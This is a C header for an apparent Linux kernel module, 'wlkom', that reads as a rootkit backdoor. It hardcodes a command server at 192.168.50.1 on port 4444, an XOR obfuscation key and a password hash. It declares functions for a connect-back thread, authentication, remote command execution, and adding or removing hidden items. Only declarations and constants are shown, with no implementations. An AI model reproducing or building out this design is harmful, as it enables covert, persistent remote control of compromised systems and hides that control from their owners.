#ifndef CONNECTION_H
#define CONNECTION_H


#include <linux/socket.h>
#include <linux/string.h>
#include <net/sock.h>

#define WLKOM_RETRY_DELAY 3000
#define WLKOM_POLL_DELAY 200
#define WLKOM_BUFFER_SIZE 256
#define WLKOM_PASSWORD_HASH 0x10a572ef

#define WLKOM_SERVER_IP "192.168.50.1"
#define WLKOM_SERVER_PORT 4444
#define WLKOM_XOR_KEY "wlkom"

int wlkom_connection_thread(void *data);
int wlkom_handle_hide_info(struct socket *sock);
int wlkom_handle_hide_add(struct socket *sock, char *buffer);
int wlkom_handle_hide_del(struct socket *sock, char *buffer);

unsigned int wlkom_hash(char *str);
void wlkom_xor_buffer(char *data, size_t len);

int wlkom_send_data(struct socket *sock, char *data);
int wlkom_recv_data(struct socket *sock, char *buffer, size_t size);
int wlkom_handle_auth(struct socket *sock, char *buffer, int *authenticated);
int wlkom_handle_exec(struct socket *sock, char *buffer);
int wlkom_handle_command(struct socket *sock, char *buffer, int *authenticated);
int wlkom_session(struct socket *sock);
int wlkom_connect_once(void);
int wlkom_connection_thread(void *data);




#endif
